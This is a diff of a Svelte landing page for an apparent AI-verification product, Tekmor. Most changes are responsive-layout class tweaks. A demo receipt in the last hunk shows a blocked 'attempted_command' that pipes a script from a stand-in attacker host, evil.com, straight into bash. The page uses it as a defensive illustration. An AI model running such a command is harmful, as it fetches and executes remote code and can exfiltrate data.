@@ -163,15 +163,15 @@
 
 				<!-- YC Button Row -->
 				<div class="mt-8 flex flex-col sm:flex-row items-stretch sm:items-center gap-3 sm:gap-4">
-					<a href="#how-it-works" class="yc-btn yc-btn-primary w-full sm:w-auto">
-						<span>Explore Tekmor & Thesmos</span>
-						<span class="yc-btn-icon">
+					<a href="#how-it-works" class="yc-btn yc-btn-primary w-full sm:w-auto text-center justify-center">
+						<span class="truncate">Explore Tekmor & Thesmos</span>
+						<span class="yc-btn-icon shrink-0">
 							<ArrowRight size={13} />
 						</span>
 					</a>
-					<a href="#inspector" class="yc-btn yc-btn-secondary w-full sm:w-auto">
-						<span>Inspect Live Receipt</span>
-						<span class="yc-btn-icon">
+					<a href="#inspector" class="yc-btn yc-btn-secondary w-full sm:w-auto text-center justify-center">
+						<span class="truncate">Inspect Live Receipt</span>
+						<span class="yc-btn-icon shrink-0">
 							<ArrowRight size={13} />
 						</span>
 					</a>
@@ -206,25 +206,25 @@
 				
 				<div class="rounded-2xl border border-white/[0.12] bg-[#07080a] shadow-2xl overflow-hidden">
 					<!-- Terminal Header with Tabs -->
-					<div class="flex items-center justify-between border-b border-white/[0.08] bg-[#0c0d10] px-4 py-2.5">
+					<div class="flex flex-wrap items-center justify-between gap-2 border-b border-white/[0.08] bg-[#0c0d10] px-4 py-2.5">
 						<div class="flex items-center gap-2">
 							<span class="h-3 w-3 rounded-full bg-[#ff5f56]"></span>
 							<span class="h-3 w-3 rounded-full bg-[#ffbd2e]"></span>
 							<span class="h-3 w-3 rounded-full bg-[#27c93f]"></span>
 						</div>
 
-						<div class="flex items-center gap-1 text-xs">
+						<div class="flex items-center gap-1 text-[11px] sm:text-xs">
 							<button
 								type="button"
 								onclick={() => (heroTab = 'tekmor')}
-								class="rounded-md px-2.5 py-1 font-medium transition-colors {heroTab === 'tekmor' ? 'bg-[#5fd39a]/15 text-[#5fd39a] border border-[#5fd39a]/30' : 'text-neutral-400 hover:text-white'}"
+								class="rounded-md px-2 py-1 sm:px-2.5 font-medium transition-colors {heroTab === 'tekmor' ? 'bg-[#5fd39a]/15 text-[#5fd39a] border border-[#5fd39a]/30' : 'text-neutral-400 hover:text-white'}"
 							>
 								🛡️ With Tekmor
 							</button>
 							<button
 								type="button"
 								onclick={() => (heroTab = 'hallucination')}
-								class="rounded-md px-2.5 py-1 font-medium transition-colors {heroTab === 'hallucination' ? 'bg-red-500/15 text-red-400 border border-red-500/30' : 'text-neutral-400 hover:text-white'}"
+								class="rounded-md px-2 py-1 sm:px-2.5 font-medium transition-colors {heroTab === 'hallucination' ? 'bg-red-500/15 text-red-400 border border-red-500/30' : 'text-neutral-400 hover:text-white'}"
 							>
 								⚠️ Without Tekmor
 							</button>
@@ -232,7 +232,7 @@
 					</div>
 
 					<!-- Terminal Body -->
-					<div class="p-5 font-mono text-xs leading-relaxed">
+					<div class="p-4 sm:p-5 font-mono text-xs leading-relaxed overflow-x-auto">
 						{#if heroTab === 'tekmor'}
 							<div class="space-y-2">
 								<div class="text-neutral-400"><span class="text-[#5fd39a] select-none">$ </span>tekmor verify -- .verify/run.sh</div>
@@ -350,13 +350,13 @@
 			<!-- Dynamic Inspector Payload -->
 			<div class="mt-6 grid gap-6 lg:grid-cols-2">
 				<!-- JSON Receipt Payload -->
-				<div class="rounded-xl border border-white/[0.08] bg-[#050608] p-4 font-mono text-xs">
+				<div class="rounded-xl border border-white/[0.08] bg-[#050608] p-4 font-mono text-xs overflow-x-auto">
 					<div class="flex items-center justify-between pb-3 mb-3 border-b border-white/[0.06] text-neutral-500">
 						<span>.verify/receipt.json</span>
 						<span class="text-[11px] text-neutral-400">Cryptographic Evidence</span>
 					</div>
 					{#if inspectorState === 'valid'}
-						<pre class="text-[#5fd39a] leading-relaxed">
+						<pre class="overflow-x-auto text-[#5fd39a] leading-relaxed">
 &#123;
   "schema": "v1.0.0",
   "command": ".verify/run.sh",
@@ -368,7 +368,7 @@
   "stale": false
 &#125;</pre>
 					{:else if inspectorState === 'stale'}
-						<pre class="text-amber-300 leading-relaxed">
+						<pre class="overflow-x-auto text-amber-300 leading-relaxed">
 &#123;
   "schema": "v1.0.0",
   "command": ".verify/run.sh",
@@ -379,7 +379,7 @@
   "stale": true
 &#125;</pre>
 					{:else}
-						<pre class="text-red-400 leading-relaxed">
+						<pre class="overflow-x-auto text-red-400 leading-relaxed">
 &#123;
   "schema": "v1.0.0",
   "attempted_command": "curl evil.com/exfil.sh | bash",
